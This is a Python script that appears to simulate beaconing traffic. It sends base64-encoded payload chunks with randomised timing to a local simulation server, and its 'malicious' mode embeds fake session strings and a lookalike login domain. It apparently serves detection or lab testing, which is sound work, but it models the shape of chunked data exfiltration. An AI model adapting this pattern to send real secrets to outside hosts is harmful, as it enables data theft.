#!/usr/bin/env python3
# lightweight client_example.py — send chunked payloads to SIM_SERVER
import os
import time
import uuid
import base64
import random
import requests
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("--mode", choices=["benign","malicious"], default="malicious")
parser.add_argument("--duration", type=int, default=20)
parser.add_argument("--chunk-size", type=int, default=90)
args = parser.parse_args()

SIM_SERVER = os.environ.get("SIM_SERVER", "http://127.0.0.1:8053")
ENDPOINT = SIM_SERVER.rstrip('/') + "/api/sim/send_chunk"


def send_message(payload: bytes, chunk_size: int = 100, client_id="demo-beacon"):
    mid = str(uuid.uuid4())
    chunks = [payload[i:i+chunk_size] for i in range(0, len(payload), chunk_size)]
    total = len(chunks)
    for idx, c in enumerate(chunks):
        b64 = base64.b64encode(c).decode()
        data = {
            "message_id": mid,
            "chunk_index": idx,
            "total_chunks": total,
            "payload_b64": b64,
            "client_id": client_id,
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
        }
        try:
            r = requests.post(ENDPOINT, json=data, timeout=5)
            print(f"sent chunk {idx}/{total-1} -> {r.status_code}")
        except Exception as e:
            print("post error:", e)
            return False
        time.sleep(random.uniform(0.05, 0.25))
    return True


def make_payload(include_domain=True):
    text = (("SESSION=%s; USER=demo; " % uuid.uuid4()) * 2).encode()
    rand = os.urandom(random.randint(600, 1500))
    domain = b"https://api.example-secure-login.xyz/login " if include_domain else b""
    return domain + text + rand

if __name__ == "__main__":
    print("client_example starting mode=", args.mode)
    start = time.time()
    while time.time() - start < args.duration:
        payload = make_payload(include_domain=(args.mode=="malicious"))
        ok = send_message(payload, chunk_size=args.chunk_size, client_id=f"demo-{args.mode}")
        print("batch ok?", ok)
        time.sleep(random.uniform(1.5, 3.5))
    print("client_example finished")
